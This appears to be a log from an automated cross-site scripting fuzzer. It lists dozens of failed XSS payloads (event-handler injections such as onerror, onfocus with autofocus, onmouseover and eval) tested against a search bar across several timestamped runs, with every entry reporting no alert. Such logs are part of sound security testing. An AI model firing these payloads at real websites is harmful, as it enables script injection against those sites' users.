+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log("XSS")> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:48:52.521424
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log("XSS")> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onkeydown=eval("alert(1)")<!--eval("alert(1)")"> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+# Failed XSS Payloads - 2025-07-22 19:49:35.851894
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+><img src=x onerror=alert(xqQiS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<select onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onstart=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1) | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onfocus=alert(1)<![CDATA[alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee id=xss onmouseover=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<input onstart=alert(1)>alert(1)]]> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div class=xss onmouseover=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onkeydown=prompt(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<div onchange=alert(1)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log(XSS)>console.log(XSS)> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<a onchange=alert(1)<!--alert(1)--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<iframe onkeydown=console.log("XSS")<!--console.log("XSS")--> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<marquee onchange=console.log("XSS")> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
+<textarea onkeydown=eval("alert(1)")<!--eval("alert(1)")"> | Alert expected | No alert or DOM change | No XSS detected in search_bar | search_bar
